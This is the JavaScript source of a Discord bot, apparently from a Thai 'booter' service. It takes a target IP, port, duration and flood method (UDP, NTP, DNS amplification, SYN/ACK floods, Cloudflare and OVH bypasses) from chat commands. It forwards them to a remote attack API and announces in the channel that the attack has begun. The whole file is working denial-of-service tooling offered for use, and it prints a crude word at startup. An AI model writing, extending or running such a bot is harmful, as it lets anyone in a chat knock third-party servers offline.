const discord = require('discord.js');
const request = require('request');
var setTitle = require('console-title');
var http = require("https");
var socket = require('net').Socket();
var colors = require('colors');
var axios = require('axios');
const config = require('./auth.json');
const { exec } = require('child_process');
const client = new discord.Client();

var gg = "\nDick\n"
//----------------function-----------------
function Warn(msg) { var embed = new discord.MessageEmbed().setTitle(msg).setColor('#CF9B10'); return embed; }
function Blue(msg) { var embed = new discord.MessageEmbed().setTitle(msg).setColor('#6AF2EA'); return embed; }
function White(msg) { var embed = new discord.MessageEmbed().setTitle(msg).setColor('#DEDBD9'); return embed; }
function Gold(msg) { var embed = new discord.MessageEmbed().setTitle(msg).setColor('#ECB821'); return embed; }
function isLetter(c) { return c.toLowerCase() != c.toUpperCase(); }
//------------------END--------------------
//-------------- Check Ready --------------------
client.on('ready', () => { console.clear(); console.log(colors.rainbow(gg,'\n')); setTitle('Bot DDOS DISCORD BY Ohayoiichan'); console.log(colors.rainbow(`Bot has started, with ${client.user.tag} users.`,'\n')); client.user.setActivity(config.prefix + 'help'); });
client.login(config.token);
//-----------------------------------------------
//----------------Help-----------------
client.on('message', (msg) => { if(msg.content === `${config.prefix}help`)
{
  const embed = new discord.MessageEmbed().setTitle('คำสั่งทั่งหมด')
  .addField('สำสั่งยิง',`\r\n${config.prefix}FREE [ไอพี] [พอท] [เวลา] [รูปแบบการยิง]\r\n`)
  .addField('รูปแบบการยิง','\r\nFREE: UDP , NTP , DNS\r\n').setColor('#09ECAE'); msg.channel.send(embed);
}});
//-----------------------------------------------
client.on('message', (msg) => { if(msg.content.startsWith(config.prefix + 'FREE'))
{
	const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
    if(args.length < 4) { msg.channel.send(Warn('ไม่ผบรูปแบบ!')); return;  }
    if(args[1].length > 29) { msg.channel.send(Warn('ความยาวipไม่ถูกต้อง!')); return; }
    if(args[1].length < 7) { msg.channel.send(Warn('ความยาวipไม่ถูกต้อง!')); return; }
    if(isLetter(args[2])) { msg.channel.send(Warn('พอร์ตต้องไม่มีอักขระ!')); return; }
    if(isLetter(args[3])) { msg.channel.send(Warn('เวลาไม่สามารถมีอักขระได้!')); return; }
    if(Number(args[2]) > 65535) { msg.channel.send(Warn('ขนาดพอร์ตสูงสุดคือ 65535!')); return; }
    if(Number(args[3]) > config.maxtime) { msg.channel.send(Warn('เวลาสูงสุดคือ ' + config.maxtime +  ' วินาที!')); return; }
    if(Number(args[3]) < config.mintime) { msg.channel.send(Warn('เวลาขั้นต่ำคือ ' + config.mintime +  ' วินาที!')); return; }
    switch(args[4])
    {
      case "BYPASSCF": break; case "HTTPGET": break; case "HTTPGET": break; case "TCP": break; case "DISCORD": break; case "CFUAM": break; case "ACK": break; case "SYN": break; case "FIN": break; case "PSH": break; case "RST": break; case "SEQ": break; case "UDP-FREE": break; case "NFO": break; case "OVH": break; case "ANON": break; case "BYPASS": break;
      default: msg.channel.send(Warn('คุณใส่รูปแบบการยิงไม่ถูกต้อง!')); break;
    }
    axios.get('http://1.1.1.1/api.php?&host=' + args[1] + '&port=' + args[2]  + '&time=' + args[3]  + '&method=' + args[4]).then(response =>
    {
      switch(response.data)
      {
        default: msg.channel.send(Blue('เริ่มยิงไปที่ ip ' + args[1] + ' เวลา ' + args[3] + ' วินาที!'));console.log('\x1b[32m','DDOS IP' + args[1] + ' time ' + args[3] + ' second! method '+ args[4] +'\n'); break;
      }
    });
}});
